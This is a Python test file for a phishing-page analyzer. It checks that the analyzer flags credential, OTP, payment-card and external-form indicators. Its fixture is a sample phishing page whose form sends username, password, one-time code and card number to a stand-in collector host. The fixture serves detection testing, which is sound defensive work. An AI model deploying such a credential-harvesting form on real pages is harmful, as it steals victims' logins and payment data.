from app.services.detectors import website_analyzer

_PHISH_HTML = """
<html><head><title>Verify your account</title>
<meta http-equiv="refresh" content="0; url=http://elsewhere.example"></head>
<body>
<form action="http://collector.example/steal" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="text" name="otp" autocomplete="one-time-code">
  <input type="text" name="cardnumber">
</form>
<iframe src="http://ads.example"></iframe>
</body></html>
"""


def _inds(r):
    return {s.indicator for s in r.signals}


def test_detects_credential_payment_otp_and_external_form():
    r = website_analyzer.analyze(_PHISH_HTML, "http://secure-login-verify.example/login")
    inds = _inds(r)
    assert "password_field" in inds
    assert "otp_field" in inds
    assert "payment_field" in inds
    assert "form_posts_external" in inds
    assert "meta_refresh" in inds
    # URL heuristics on the final URL are merged in.
    assert ("secure-login-verify.example", "domain") in r.indicators


def test_benign_page_is_quiet():
    r = website_analyzer.analyze("<html><title>Hello</title><body>hi</body></html>",
                                 "https://example.com/")
    assert "password_field" not in _inds(r)
